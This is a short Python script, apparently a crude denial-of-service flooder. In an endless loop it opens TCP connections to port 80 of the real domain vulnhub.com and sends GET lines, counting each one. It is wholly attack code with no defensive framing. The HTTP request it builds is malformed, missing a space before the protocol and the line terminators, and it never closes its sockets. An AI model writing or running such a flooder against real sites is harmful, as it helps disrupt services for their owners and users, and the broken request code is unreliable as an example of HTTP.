import socket

ip = socket.gethostbyname("vulnhub.com")
pot = 80

request_send = 0

def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, pot))
    #send a get request in this web server
    s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
  
    global request_send
    request_send +=1
    if request_send%10==0:
        print(request_send)


while True:
    attack()    




